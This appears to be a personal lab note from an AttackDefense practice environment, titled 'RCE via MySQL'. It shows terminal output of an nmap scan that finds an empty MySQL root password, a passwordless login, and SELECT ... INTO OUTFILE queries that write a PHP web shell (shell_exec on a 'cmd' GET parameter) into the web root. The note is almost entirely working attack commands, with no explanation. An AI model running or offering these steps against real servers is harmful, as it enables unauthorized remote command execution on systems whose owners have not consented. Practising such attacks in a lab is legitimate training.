
RCE via MySQL

root@attackdefense:~# sudo nmap -sS -sV --script mysql-empty-password -p 3306 192.28.127.3
sudo: setrlimit(RLIMIT_CORE): Operation not permitted
Starting Nmap 7.70 ( https://nmap.org ) at 2025-09-30 15:45 IST
Nmap scan report for target-1 (192.28.127.3)
Host is up (0.000057s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.56-log
| mysql-empty-password: 
|_  root account has empty password
MAC Address: 02:42:C0:1C:7F:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .


root@attackdefense:~# mysql -u root -h 192.28.127.3
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 18
Server version: 5.5.56-log MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
MySQL [(none)]> show databases;               
+--------------------+
| Database           |
+--------------------+
| information_schema |
| adive              |
| mysql              |
| performance_schema |
| test               |
+--------------------+
5 rows in set (0.002 sec)

MySQL [(none)]> select 'Hello World' into outfile '/tmp/test' from mysql.user limit 1;
Query OK, 1 row affected (0.001 sec)

MySQL [(none)]> select '<?php $output=shell_exec($_GET["cmd"]);echo "<pre>"$output"</pre>"?>' into outfile'/var/www/html/shell.php' from mysql.user limit 1;
Query OK, 1 row affected (0.003 sec)
MySQL [(none)]> select '<?php $output=shell_exec($_GET["cmd"]);echo "<pre>".$output."</pre>"?>' into outfile'/var/www/html/test.php' from mysql.user limit 1;
Query OK, 1 row affected (0.001 sec)

![[Pasted image 20250930132543.png]]



